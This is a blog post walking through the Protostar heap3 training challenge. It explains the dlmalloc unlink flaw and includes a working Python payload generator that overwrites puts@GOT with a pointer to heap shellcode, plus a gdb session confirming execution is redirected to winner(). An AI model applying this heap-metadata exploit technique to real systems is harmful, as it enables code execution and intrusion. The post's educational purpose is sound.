---
layout: post
title:  "Protostar heap3 challenge"
date:   2019-02-20 18:26:36 +0530
categories: exploit.education protostar heap-three
---
This exercise is based on dl-malloc vulnerability as mentioned in exercise notes. Understanding this bug and how to exploit it required some deep observations from myself.
Below is the code for exercise [heap3][heap3-link]

{% highlight cpp %}
This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution.
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;
  a = malloc(32);
  b = malloc(32);
  c = malloc(32);
  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);
  free(c);
  free(b);
  free(a);
  printf("dynamite failed?\n");
}
{% endhighlight %}
For this exercise i had to talk lot of help from walkthroughs available online like [liveoverflow.com/heap3][liveoverflow-heap3-link] which still keep me somewhat confused. Though 
[Protostar Heap 3 Walkthrough][medium-heap3-link] was the best lucid explanation of all. So i would keep this walkthrough less in detail and only focus on most important points.

The vulnerabilty here is how free is implemented by dl-malloc(though this has long been patched).
Memory is managed in form of chunks. `prev_size` is size of previous chunk. `size` is size of current chunk(ie malloced size + 8 for meta-data). Last bit of `size` is set if previous chunk is used. `Free` chunks are arranged in a circular doubly linked list for management. `fd/bk` point to next/prev free chunk in list. If chunk is used `fd` and `bk` is overwritten with data.
{% highlight cpp %}
struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;
  INTERNAL_SIZE_T      size;

  struct malloc_chunk* fd;
  struct malloc_chunk* bk;
};
{% endhighlight %}
If a call `free(a)` is made, dl-malloc checks if prev/next adjacent chunk is free. If so it unlinks that chunk from free list and merges it with chunk being freed ie `a`. The `unlink` procedure is where vulnerability lies.
{% highlight cpp %}
#define unlink(P, BK, FD) { \
  FD = P->fd;               \
  BK = P->bk;               \
  FD->bk = BK;              \
  BK->fd = FD;              \
}
{% endhighlight %}
`FD->bk = BK` can be used for exploit. Where `FD->bk` can be `GOT` address of `puts` call later on. Note `BK` on RHS should also be writeable memory as `BK->fd = FD` call is also made later on. So `BK` cannot be address if `winner()` but it can be address if shellcode placed in our heap.
Now, the size of our chunk has to be greater than `100` or `0x64` else dl-malloc switches to `fastbins` which are implemented in somewhat different manner and this exploit cannot be used for it.
A smart way of doing so is mentioned in [phrack-article-Once-upon-a-free()][phrack-once-upon-a-free-link]. If size is kept as `-4(0xfffffffc)` it has two benefits. 

1. We will be using `strcpy` to pass our values to heap. Since `strcpy` is `\x00(null)` terminated, our input string cannot have `\x00`. On a 32-bit system `0xfffffffc` overflows maximum signed size and is interpreted as `-4` which will have no `\x00`.
2. Start of previous free chunk is found by subtracting current chunk size from start ie `start-currentchunk - size-currentchnk`. So if size is `-4` this will put start of prev chunk 4 byte after start of current chunk.

We find address of `winner()` and create shellcode for it and then convert it to hex.
{% highlight shell %}
user@protostar:~$ objdump -t /opt/protostar/bin/heap3  | grep winner
08048864 g     F .text	00000025              winner
rawat@rawat-VirtualBox:~$ cat temp.asm 
push 0x08048864
ret
rawat@rawat-VirtualBox:~$ nasm -felf temp.asm 
rawat@rawat-VirtualBox:~$ objdump -D ./temp.o |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x68\x64\x88\x04\x08\xc3"
{% endhighlight %}
With all above knowledge we can now create our exploit input.
{% highlight cpp %}
#!/usr/bin/python

# usage:
# run this script, then start heap3 as:
# ./heap3 $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
# the script will write /tmp/[A,B,C] payloads

import struct

# first argument
buf1 = ''
buf1 += 'AAAA' # unused

# second argument
buf2 = ''
buf2 += '\xff'*16
buf2 += "\x68\x64\x88\x04\x08\xc3" # shellcode
buf2 += '\xff'*(32-len(buf2))
# overwrite prev_size and size of the last chunk with -4
buf2 += struct.pack('I', 0xfffffffc)*2

# third argument
buf3 = ''
buf3 += '\xff'*4 # junk
buf3 += struct.pack('I', 0x804b128-12) # puts@GOT-12
buf3 += struct.pack('I', 0x804c040) # address of the shellcode

files = ["/tmp/A", "/tmp/B", "/tmp/C"]
buffers = [buf1, buf2, buf3]

for f_name, buf in zip(files, buffers):
        with open(f_name, 'wb') as f:
                f.write(buf)
{% endhighlight %}
We will step through gdb and check how this works.
We place breakpoints:
1. After all malloc but bfore strcpy.
2. After all strcpy but before free.
3. After first free.
and place hook-stop to print heap and `GOT` each time breakpoint is hit.
{% highlight shell %}
user@protostar:~$ gdb /opt/protostar/bin/heap3
Reading symbols from /opt/protostar/bin/heap3...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
0x08048889 <main+0>:	push   ebp
0x0804888a <main+1>:	mov    ebp,esp
0x0804888c <main+3>:	and    esp,0xfffffff0
0x0804888f <main+6>:	sub    esp,0x20
0x08048892 <main+9>:	mov    DWORD PTR [esp],0x20
0x08048899 <main+16>:	call   0x8048ff2 <malloc>
0x0804889e <main+21>:	mov    DWORD PTR [esp+0x14],eax
0x080488a2 <main+25>:	mov    DWORD PTR [esp],0x20
0x080488a9 <main+32>:	call   0x8048ff2 <malloc>
0x080488ae <main+37>:	mov    DWORD PTR [esp+0x18],eax
0x080488b2 <main+41>:	mov    DWORD PTR [esp],0x20
0x080488b9 <main+48>:	call   0x8048ff2 <malloc>
0x080488be <main+53>:	mov    DWORD PTR [esp+0x1c],eax
0x080488c2 <main+57>:	mov    eax,DWORD PTR [ebp+0xc]
0x080488c5 <main+60>:	add    eax,0x4
0x080488c8 <main+63>:	mov    eax,DWORD PTR [eax]
0x080488ca <main+65>:	mov    DWORD PTR [esp+0x4],eax
0x080488ce <main+69>:	mov    eax,DWORD PTR [esp+0x14]
0x080488d2 <main+73>:	mov    DWORD PTR [esp],eax
0x080488d5 <main+76>:	call   0x8048750 <strcpy@plt>
0x080488da <main+81>:	mov    eax,DWORD PTR [ebp+0xc]
0x080488dd <main+84>:	add    eax,0x8
0x080488e0 <main+87>:	mov    eax,DWORD PTR [eax]
0x080488e2 <main+89>:	mov    DWORD PTR [esp+0x4],eax
0x080488e6 <main+93>:	mov    eax,DWORD PTR [esp+0x18]
0x080488ea <main+97>:	mov    DWORD PTR [esp],eax
0x080488ed <main+100>:	call   0x8048750 <strcpy@plt>
0x080488f2 <main+105>:	mov    eax,DWORD PTR [ebp+0xc]
0x080488f5 <main+108>:	add    eax,0xc
0x080488f8 <main+111>:	mov    eax,DWORD PTR [eax]
0x080488fa <main+113>:	mov    DWORD PTR [esp+0x4],eax
0x080488fe <main+117>:	mov    eax,DWORD PTR [esp+0x1c]
0x08048902 <main+121>:	mov    DWORD PTR [esp],eax
0x08048905 <main+124>:	call   0x8048750 <strcpy@plt>
0x0804890a <main+129>:	mov    eax,DWORD PTR [esp+0x1c]
0x0804890e <main+133>:	mov    DWORD PTR [esp],eax
0x08048911 <main+136>:	call   0x8049824 <free>
0x08048916 <main+141>:	mov    eax,DWORD PTR [esp+0x18]
0x0804891a <main+145>:	mov    DWORD PTR [esp],eax
0x0804891d <main+148>:	call   0x8049824 <free>
0x08048922 <main+153>:	mov    eax,DWORD PTR [esp+0x14]
0x08048926 <main+157>:	mov    DWORD PTR [esp],eax
0x08048929 <main+160>:	call   0x8049824 <free>
0x0804892e <main+165>:	mov    DWORD PTR [esp],0x804ac27
0x08048935 <main+172>:	call   0x8048790 <puts@plt>
0x0804893a <main+177>:	leave  
0x0804893b <main+178>:	ret    
End of assembler dump.
(gdb) b *0x080488c2
Breakpoint 1 at 0x80488c2: file heap3/heap3.c, line 20.
(gdb) b *0x0804890a
Breakpoint 2 at 0x804890a: file heap3/heap3.c, line 24.
(gdb) b *0x08048916
Breakpoint 3 at 0x8048916: file heap3/heap3.c, line 25.
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/40x 0x804c000
>x/x 0x804b128
{% endhighlight %}

{% highlight shell %}
(gdb) r $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
Starting program: /opt/protostar/bin/heap3 $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
0x804c000:	0x00000000	0x00000029	0x00000000	0x00000000
0x804c010:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c020:	0x00000000	0x00000000	0x00000000	0x00000029
0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c050:	0x00000000	0x00000029	0x00000000	0x00000000
0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000f89
0x804c080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b128 <_GLOBAL_OFFSET_TABLE_+64>:	0x08048796

Breakpoint 1, main (argc=4, argv=0xbffff844) at heap3/heap3.c:20
20	in heap3/heap3.c
(gdb) c
Continuing.
0x804c000:	0x00000000	0x00000029	0x41414141	0x00000000
0x804c010:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c020:	0x00000000	0x00000000	0x00000000	0x00000029
0x804c030:	0xffffffff	0xffffffff	0xffffffff	0xffffffff
0x804c040:	0x04886468	0xffffc308	0xffffffff	0xffffffff
0x804c050:	0xfffffffc	0xfffffffc	0xffffffff	0x0804b11c
0x804c060:	0x0804c040	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000f89
0x804c080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b128 <_GLOBAL_OFFSET_TABLE_+64>:	0x08048796

Breakpoint 2, main (argc=4, argv=0xbffff844) at heap3/heap3.c:24
24	in heap3/heap3.c
(gdb) c
Continuing.
0x804c000:	0x00000000	0x00000029	0x41414141	0x00000000
0x804c010:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c020:	0x00000000	0x00000000	0x00000000	0x00000029
0x804c030:	0xffffffff	0xffffffff	0xffffffff	0xffffffff
0x804c040:	0x04886468	0xffffc308	0x0804b11c	0xfffffff8
0x804c050:	0xfffffffc	0xfffffffc	0xfffffff9	0x0804b194
0x804c060:	0x0804b194	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000f89
0x804c080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b128 <_GLOBAL_OFFSET_TABLE_+64>:	0x0804c040

Breakpoint 3, main (argc=4, argv=0xbffff844) at heap3/heap3.c:25
25	in heap3/heap3.c
{% endhighlight %}
We see after free, `GOT` is modified to address of our shell placed in heap. Also due to `BK->fd = FD` part of unlink, heap values after shellcode is overwritten. But luckily our shellcode is only `8byte` long and is not modified by it.
And thus we successfully redirect execution to winner.
{% highlight shell %}
(gdb) c
Continuing.
that wasn't too bad now, was it? @ 1551106050

Program exited with code 056.
0x804c000:	Error while running hook_stop:
Cannot access memory at address 0x804c000
{% endhighlight %}


[heap3-link]:https://exploit.education/protostar/heap-three/
[liveoverflow-heap3-link]:http://liveoverflow.com/binary_hacking/protostar/heap3.html
[medium-heap3-link]:https://medium.com/@airman604/protostar-heap-3-walkthrough-56d9334bcd13
[phrack-once-upon-a-free-link]:http://phrack.org/issues/57/9.html